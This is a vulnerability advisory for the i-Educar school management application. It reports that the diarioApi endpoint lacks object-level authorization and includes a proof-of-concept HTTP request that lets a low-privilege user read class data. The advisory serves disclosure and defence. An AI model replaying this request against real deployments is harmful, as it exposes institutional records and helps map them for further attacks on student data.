@@ -1,0 +1,79 @@
+Broken Object Level Authorization (BOLA) Broken Object Level Authorization (BOLA) allows enumeration of classes data via /module/Avaliacao/diarioApi
+### Summary
+
+A **Broken Object Level Authorization (BOLA)** vulnerability was identified in the `diario` API of the **i-Educar** application. This flaw allows a user without proper permissions to query the endpoint and retrieve ** class information**  by manipulating request parameters.
+
+Although this vulnerability does not directly expose individual student data, it still constitutes an **unauthorized disclosure of academic structure information**, which can be leveraged for enumeration or as a stepping stone for further attacks.
+
+---
+
+### Details
+
+**Vulnerable Endpoint:**  
+`GET /module/Avaliacao/diarioApi`
+
+The application fails to enforce **object-level authorization** when handling this endpoint. As a result, any authenticated user can manipulate the request values to access data that they shouldn't.
+
+**Expected behavior:**
+
+- Only authorized roles (e.g., administrators, coordinators, teachers linked to the class) should be able to access this data.
+    
+- Unauthorized users should receive **403 Forbidden** or an empty response.
+    
+
+**Observed behavior:**
+
+- Any authenticated user (even low-privilege accounts) can access this endpoint and retrieve sensitive information about academic classes.
+
+---
+### Proof of Concept (PoC)
+
+1. Authenticate as a non-privileged user.
+
+![[Pasted image 20250905173645.png]]
+![[Pasted image 20250821225232.png]]
+2. Send the following request:
+
+```
+GET /module/Avaliacao/diarioApi?&resource=matriculas&oper=get&instituicao_id=1&escola_id=3&curso_id=4&serie_id=undefined&turma_id=3&ano_escolar=2025&componente_curricular_id=11&etapa=1&matricula_id=12&busca=S&mostrar_botao_replicar_todos=1&ano=2025&ref_cod_instituicao=1&ref_cod_escola=3&ref_cod_curso=4&ref_cod_serie=6&ref_cod_turma=3&etapa=1&ref_cod_componente_curricular=11&ref_cod_matricula=12&navegacao_tab=2 HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br, zstd
+X-Requested-With: XMLHttpRequest
+Connection: keep-alive
+Referer: http://localhost/module/Avaliacao/diario?&resource=matriculas&oper=get&instituicao_id=1&escola_id=3&curso_id=4&serie_id=undefined&turma_id=3&ano_escolar=2025&componente_curricular_id=11&etapa=1&matricula_id=12
+Cookie: educar_session=[low-privileged-session]
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=0
+
+```
+
+![[Pasted image 20250905173506.png]]
+
+3. We could observe that informations about classes were returned.
+
+
+---
+
+### Impact
+
+- **Information Disclosure:** Even though student data is not included, sensitive details about the institution’s internal structure (classes, courses, schedules) are exposed.
+    
+- **Reconnaissance Vector:** An attacker could use this endpoint to map out the entire academic structure, identifying valid IDs.
+    
+- **Chaining attacks:** Combined with other vulnerabilities (e.g., BOLA on enrollment endpoints), this facilitates enumeration and targeted exploitation of student records.
+    
+- **Compliance Risk:** Exposure of institutional metadata to unauthorized users can still represent a data governance issue.
+    
+
+---
+
+## Discoverer
+
+[Marcelo Queiroz](www.linkedin.com/in/marceloqueirozjr)
+
+by [CVE-Hunters](https://github.com/Sec-Dojo-Cyber-House/cve-hunters)
